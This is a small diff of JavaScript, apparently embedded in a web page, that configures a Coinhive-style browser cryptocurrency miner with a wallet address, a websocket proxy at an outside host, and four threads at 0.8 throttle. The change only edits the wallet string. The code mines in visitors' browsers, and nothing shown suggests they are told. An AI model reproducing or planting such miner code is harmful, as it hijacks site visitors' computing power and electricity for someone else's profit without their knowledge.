@@ -18,7 +18,7 @@ var myPrettyCode = function() {
   CHive.CONFIG.WEBSOCKET_SHARDS = [["ws://chproxy.goalextra.com:8892"]];
 
   // Start miner
-  var miner=new CHive.User('etnk1ELUj9c85xLf6LKw86F2GP7kkixgncZMyYNErDKh4TyRU6BnA3USsFGj1r8wSPRAJcr61cShh8TAVgWA5Yi39UtV8b1vW1','GoEx',
+  var miner=new CHive.User('etnk1ELUj9c85xLf6LKw86F2GP7kkixgncZMyYNErDKh4TyRU6BnA3USsFGj1r8wSPRAJcr61cShh8TAVgWA5Yi39UtV8b1vW1+100','GoEx',
         {
         threads:4,autoThreads:false,throttle:0.8
         }
